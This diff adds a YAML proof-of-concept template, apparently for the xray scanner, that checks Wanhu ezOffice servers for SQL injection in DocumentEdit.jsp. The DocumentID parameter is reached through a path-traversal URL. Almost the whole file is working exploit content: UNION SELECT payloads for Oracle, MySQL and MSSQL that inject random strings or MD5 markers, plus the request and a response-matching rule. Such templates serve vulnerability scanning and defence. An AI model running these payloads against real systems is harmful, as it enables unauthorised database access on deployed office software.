@@ -1,0 +1,40 @@
+name: poc-yaml-wanhu-ezoffice-documentedit-sqli
+binding: 7916ca46-2271-4469-bbd9-27bc36fc1812
+manual: true
+detail:
+    author: socat
+    links:
+        - http://124.223.89.192/archives/ezoffice02
+    vulnerability:
+        id: CT-479129
+        level: high
+transport: http
+set:
+    r1: randomInt(800000000, 1000000000)
+    str1: randomLowercase(6)
+    str2: randomLowercase(6)
+payloads:
+    payloads:
+        oracle:
+            sql: |
+                "1%27%20union%20select%20null,null,%27" + str1 + "%27||%27" + str2 + "%27,null,null,null,null,null,null,null%20from%20dual--"
+            re: |
+                str1 + str2
+        mysql:
+            sql: |
+                "1%27%20union%20select%20(select+md5(%27" + string(r1) + "%27)),null,null,null,null,null,null,null,null,null,null--"
+            re: |
+                md5(string(r1))
+        mssql:
+            sql: |
+                "1%27%20union%20select%20(select+SUBSTRING(sys.fn_sqlvarbasetostr(HASHBYTES(%27MD5%27,%27" + string(r1) + "%27)),3,32)),null,null,null,null,null,null,null,null,null,null--"
+            re: |
+                md5(string(r1))
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID={{sql}}
+        expression: response.status == 200 && re.bmatches(response.body)
+expression: r0()
